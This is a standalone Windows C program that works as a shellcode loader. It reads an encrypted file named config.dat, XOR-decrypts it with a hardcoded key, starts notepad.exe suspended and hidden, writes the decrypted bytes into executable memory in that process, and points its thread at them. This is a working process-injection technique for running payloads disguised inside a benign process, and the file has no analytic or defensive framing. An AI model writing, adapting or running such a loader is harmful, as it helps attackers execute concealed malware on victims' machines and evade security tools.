#include <Windows.h>

int main() {
    HANDLE hFile = CreateFileA("config.dat", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return 1;
    }
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        return 1;
    }
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);

    BYTE key[] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0};
    int keyLen = sizeof(key);
    for (DWORD i = 0; i < fileSize; i++) {
        buffer[i] ^= key[i % keyLen];
    }

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }

    LPVOID remote_addr = VirtualAllocEx(pi.hProcess, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_addr) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    if (!WriteProcessMemory(pi.hProcess, remote_addr, buffer, fileSize, NULL)) {
        VirtualFreeEx(pi.hProcess, remote_addr, 0, MEM_RELEASE);
        VirtualFree(buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        VirtualFreeEx(pi.hProcess, remote_addr, 0, MEM_RELEASE);
        VirtualFree(buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
#ifdef _WIN64
    ctx.Rip = (DWORD64)remote_addr;
#else
    ctx.Eip = (DWORD)remote_addr;
#endif
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    VirtualFree(buffer, 0, MEM_RELEASE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
